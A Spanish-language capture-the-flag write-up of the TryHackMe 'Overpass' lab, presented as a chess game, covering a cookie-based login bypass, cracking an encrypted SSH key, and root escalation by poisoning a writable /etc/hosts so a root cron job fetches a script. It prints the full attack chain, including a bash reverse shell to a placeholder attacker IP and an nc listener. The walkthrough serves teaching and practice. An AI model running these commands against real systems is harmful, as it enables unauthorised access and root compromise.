```
♟ PARTIDA 010
  OVERPASS
  TryHackMe · Medium · Linux
```

```bash
$ whoami
> t474_r0b07

$ cat /etc/context
> un gestor de contraseñas "inexpugnable".
> autenticación rota en el cliente.
> clave ssh protegida con contraseña débil.
> crontab que descarga y ejecuta script externo.
> /etc/hosts con permisos de escritura.
> esta tiene narrativa propia.
```

---

## `> ♟ APERTURA: lectura del tablero`

```bash
$ cat first_impression.txt
> overpass.
> venden un gestor de contraseñas.
> el sitio dice que es inexpugnable.
> eso es una promesa interesante.
```

> Overpass es una empresa ficticia que vende un gestor de contraseñas con slogan de seguridad. La ironía está construida en la sala: el producto promete proteger contraseñas y el sistema que lo hospeda tiene la autenticación rota en el lado del cliente. No es descuido técnico accidental. Es una contradicción estructural. El zapatero sin zapatos.

---

## `> ♞ PIEZA EXPUESTA: reconocimiento`

```bash
$ nmap -sV -sC <IP>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6
80/tcp open  http    Golang
```

```bash
$ gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

/admin/     (Status: 200)
/downloads/ (Status: 200)
/aboutus/   (Status: 200)
```

> `/admin/`. Panel de login. La estructura es estándar: hasta que lees el JavaScript.

---

## `> ♝ HIPÓTESIS: línea de juego`

```bash
$ view-source:http://<IP>/admin/login.js

> async function login() {
>   ...
>   if (statusOrCookie === "Incorrect credentials") {
>     ...
>   } else {
>     Cookies.set("SessionToken", statusOrCookie)
>     window.location = "/admin"
>   }
> }
```

> El cliente verifica si la respuesta es exactamente `"Incorrect credentials"`. Cualquier otra respuesta: incluyendo un error del servidor: activa el flujo de autenticación exitosa y setea la cookie. La lógica asume que solo hay dos estados posibles. Hay más.

---

## `> ♜ INICIATIVA: ruptura · fase 1: bypass de autenticación`

```bash
$ # abrir devtools
$ # Application → Cookies
$ # crear: SessionToken = cualquier_valor
$ # recargar /admin
```

> Acceso concedido. El sistema vio la cookie. No verificó su valor. Entregó el panel.

```bash
$ # panel de admin muestra:
> SSH Key for james:
> -----BEGIN RSA PRIVATE KEY-----
> Proc-Type: 4,ENCRYPTED
> ...
```

> Una clave privada SSH protegida con contraseña. El sistema la entregó en el panel pero cifró la clave. Otro supuesto: que el cifrado de la clave compensaría el bypass de autenticación.

---

## `> ♜ INICIATIVA: ruptura · fase 2: crackeo de clave`

```bash
$ ssh2john id_rsa > hash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

> james : [REDACTED]
```

```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa james@<IP>

> james@overpass:~$

$ cat user.txt
> THM{[REDACTED]}
```

---

## `> ♛ REY EXPUESTO: escalada · envenenamiento de crontab`

```bash
$ cat /etc/crontab

> * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

> Cada minuto. Como root. Descarga un script de un dominio y lo ejecuta directamente con bash. Sin verificación de integridad. Sin firma. Lo que devuelva ese dominio se ejecuta como root.

```bash
$ ls -la /etc/hosts

> -rw-rw-rw- 1 root root ... /etc/hosts
```

> Curioso.
>
> `/etc/hosts` tiene permisos de escritura para todos. James puede modificarlo. Si `overpass.thm` apunta a nuestra IP, el crontab descargará nuestro script.

```bash
$ echo '<IP_ATACANTE> overpass.thm' >> /etc/hosts

$ mkdir -p ~/downloads/src/
$ echo 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1' > ~/downloads/src/buildscript.sh

$ python3 -m http.server 80
$ nc -lvnp 4444
```

> Siguiente minuto. El crontab ejecutó. Pidió el script a nuestra IP. Lo recibió. Lo ejecutó como root.

```bash
> root@overpass:~#
```

---

## `> ♚ JAQUE MATE`

```bash
$ cat /root/root.txt
> THM{[REDACTED]}
```

---

## `> ♜ ANÁLISIS DE LA PARTIDA: ¿dónde perdió el rey?`

```bash
$ cat postmortem.txt

MOVIMIENTO 1: autenticación verificada en cliente · bypasseable con cookie vacía
MOVIMIENTO 2: clave ssh entregada en panel sin autenticación real
MOVIMIENTO 3: crontab de root ejecuta script externo sin verificación
MOVIMIENTO 4: /etc/hosts con permisos de escritura para todos los usuarios
```

> Cuatro movimientos. Cada uno rompe un supuesto distinto.
>
> El bypass de autenticación rompe el supuesto de que verificar en el cliente es suficiente. El crackeo rompe el supuesto de que la contraseña de la clave era fuerte. El crontab rompe el supuesto de que el dominio siempre va a responder con el script correcto. Y los permisos de `/etc/hosts` rompen el supuesto de que solo root puede decirle al sistema a dónde apunta un dominio.
>
> Overpass vendía un gestor de contraseñas inexpugnable. Su propio sistema tenía la autenticación rota en JavaScript y un crontab que ejecutaba código arbitrario como root cada minuto.
>
> La contradicción estaba en el producto desde el principio.

```bash
$ echo $LESSON
> un crontab que descarga y ejecuta sin verificar
> es una puerta trasera con temporizador.
> y /etc/hosts con permisos 777
> es el mapa para usarla.
```

---

> *partida 010 · overpass · jaque mate confirmado*
> *serie TryHackMe · 10/10 partidas · cerrada*
> *→ [t474-r0b07](https://github.com/t474-r0b07)*

<!--
  vendían seguridad.
  su autenticación estaba en el cliente.
  el crontab ejecutaba lo que le dijeran.
  la contradicción era el producto.
-->
